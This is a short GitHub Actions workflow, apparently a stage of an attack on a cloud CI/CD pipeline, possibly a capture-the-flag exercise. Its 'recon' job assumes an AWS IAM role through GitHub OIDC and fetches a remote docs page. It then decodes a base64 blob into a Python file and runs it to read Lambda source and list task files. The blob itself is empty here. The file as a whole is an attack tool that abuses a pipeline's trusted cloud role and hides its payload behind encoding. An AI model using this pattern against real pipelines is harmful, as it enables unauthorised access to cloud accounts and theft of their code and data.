name: Stage2

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  recon:
    runs-on: ubuntu-latest

    steps:
      - name: Assume CICD role through GitHub OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::121774052880:role/cicdRole
          aws-region: us-east-1


      - name: Fetch docs.html
        run: |
          curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html


      - name: Read Lambda source + list task files
        run: |
          pip install requests requests-aws4auth --quiet
          B64=''
          printf '%s' "$B64" | base64 -d > /tmp/src2.py && python3 /tmp/src2.py
